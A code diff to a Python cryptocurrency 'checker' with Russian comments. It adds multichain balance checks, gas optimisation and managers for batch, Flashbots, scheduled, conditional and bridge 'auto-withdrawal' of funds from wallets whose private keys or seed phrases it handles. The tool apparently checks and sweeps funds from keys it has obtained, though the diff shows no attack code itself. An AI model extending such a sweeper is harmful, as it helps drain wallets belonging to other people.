@@ -14,6 +14,20 @@ from checkers.crypto_extensions import (
     export_to_excel
 )
 from checkers.defi_checker import check_all_defi_positions
+from checkers.multichain_checker import (
+    check_multichain_balance,
+    get_optimal_gas_price,
+    monitor_gas_prices,
+    find_best_gas_time,
+    EVM_CHAINS
+)
+from checkers.advanced_withdraw import (
+    BatchWithdrawManager,
+    FlashbotsManager,
+    ScheduledWithdrawManager,
+    ConditionalWithdrawManager,
+    BridgeManager
+)
 
 _WALLET_PATTERNS = [
     ("bitcoin",   re.compile(r'^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$')),
@@ -134,6 +148,19 @@ class CryptoChecker(BaseChecker):
             "start_time": None,
             "end_time": None,
         }
+        
+        # v1.0.54: Новые менеджеры для улучшенного автовывода
+        self.batch_manager = BatchWithdrawManager()
+        self.flashbots_manager = FlashbotsManager()
+        self.scheduled_manager = ScheduledWithdrawManager()
+        self.conditional_manager = ConditionalWithdrawManager()
+        self.bridge_manager = BridgeManager()
+        
+        # Настройки мультичейн проверки
+        self.multichain_enabled = False  # Включить одновременную проверку всех сетей
+        self.gas_optimization_enabled = True  # EIP-1559 оптимизация
+        self.flashbots_enabled = False  # MEV защита
+        self.batch_enabled = False  # Batch транзакции
         
         self.auth_info = {
             "bitcoin":   {"auth_type":"Приватный ключ / Сид-фраза","wallets":"Electrum, Exodus, Trust Wallet","how":"Скачай кошелек Electrum, нажми 'Создать/Восстановить кошелек', выбери импорт приватного ключа или BIP-39 сид-фразы."},
